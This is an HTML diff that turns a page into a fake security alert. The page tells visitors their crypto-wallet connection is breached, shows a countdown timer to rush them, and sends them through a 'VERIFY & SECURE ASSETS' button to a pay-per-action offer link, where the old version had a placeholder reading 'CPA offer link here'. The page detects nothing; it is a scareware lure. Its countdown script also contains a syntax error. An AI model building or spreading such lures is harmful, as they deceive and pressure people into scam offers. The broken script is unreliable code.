@@ -3,24 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SECURITY PROTOCOL | TERMINAL</title>
+    <title>SECURITY PROTOCOL | ALERT</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { border: 2px solid #ff0000; padding: 20px; text-align: center; box-shadow: 0 0 15px #ff0000; max-width: 90%; }
-        .loader { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background: #ff0000; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 2px solid #ff0000; padding: 30px; text-align: center; box-shadow: 0 0 20px #ff0000; width: 350px; }
+        .timer { font-size: 2rem; margin: 20px 0; color: #fff; text-shadow: 0 0 10px #ff0000; }
+        .warning { animation: blink 0.8s infinite; font-weight: bold; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        button { background: #ff0000; color: #000; border: none; padding: 15px 25px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1rem; }
         button:hover { background: #fff; }
-        .status { color: #0f0; margin-bottom: 10px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h1>CRITICAL ALERT</h1>
-        <p class="status">[ SYSTEM: VULNERABILITY DETECTED ]</p>
-        <p>Your Crypto Assets may be at risk. A security patch is required to secure your connection.</p>
-        <div class="loader"></div>
-        <a href="رابط_عرض_الـ_CPA_هنا"><button>VERIFY & SECURE NOW</button></a>
+        <div class="warning">⚠️ SECURITY BREACH DETECTED</div>
+        <p>Your Crypto-Wallet connection is unstable. Security patch will expire in:</p>
+        <div id="countdown" class="timer">05:00</div>
+        <a href="https://vclload.com/1628178"><button>VERIFY & SECURE ASSETS</button></a>
+        <p style="font-size: 0.7rem; color: #555; margin-top: 15px;">ID: SIGMA-PROTO-2026</p>
     </div>
+
+    <script>
+        let time = 300;
+        const display = document.querySelector('#countdown');
+        setInterval(() => {
+            let minutes = Math.floor(time / 60);
+            let seconds = time % 60;
+            display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${${seconds < 10 ? '0' : ''}${seconds}`;
+            if (time > 0) time--;
+        }, 1000);
+    </script>
 </body>
 </html>
